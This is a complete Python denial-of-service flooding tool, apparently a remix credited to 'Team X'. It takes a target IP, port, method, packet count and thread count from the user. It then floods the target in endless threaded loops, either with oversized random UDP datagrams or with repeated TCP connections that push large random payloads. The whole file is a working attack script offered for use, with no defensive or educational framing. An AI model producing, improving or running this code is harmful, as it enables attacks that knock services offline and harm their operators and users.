#!/usr/bin/env python3
#Code by LeeOn123 Remake & Upgrade Tools By Igametopia
import os
import sys
import random
import socket
import threading
import time

os.system('color ' +random.choice(['a', 'b', 'c', 'd', 'e'])+ " & title IgamePersonal")
print("""

      ████████╗███████╗░█████╗░███╗░░░███╗  {g}██╗░░██╗
      ╚══██╔══╝██╔════╝██╔══██╗████╗░████║  {g}╚██╗██╔╝
      ░░░██║░░░█████╗░░███████║██╔████╔██║  {g}░╚███╔╝░
      ░░░██║░░░██╔══╝░░██╔══██║██║╚██╔╝██║  {g}░██╔██╗░ 
      ░░░██║░░░███████╗██║░░██║██║░╚═╝░██║  {g}██╔╝╚██╗ 
      ░░░╚═╝░░░╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚═╝  {g} ╚═╝░░╚═╝╝                                                                                              
                                                                             """)

print("Tools Version : V1 ")
print("devlloper : BAL7A X ")
print("SON3 TONSI BY TEAM X ")

ip = str(input(">> IP Address :"))
port = int(input(">> Port : "))
choice = str(input(">> Method : "))
times = int(input(">> Packets : "))
threads = int(input(">> Threads : "))
def run():
	data = random._urandom(600000)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Sent!!!")
		except:
			print("[!] Error!!!")

def run2():
	data = random._urandom(100048)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
			s.connect((ip,port))
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			s.send(data)
			for x in range(times):
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
				s.send(data)
			print(i +" OMO TNEKT!!!")
		except:
			s.close()
			print("TEAM X IN ATTACK " + ip)

for y in range(threads):
	if choice == "y":
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()

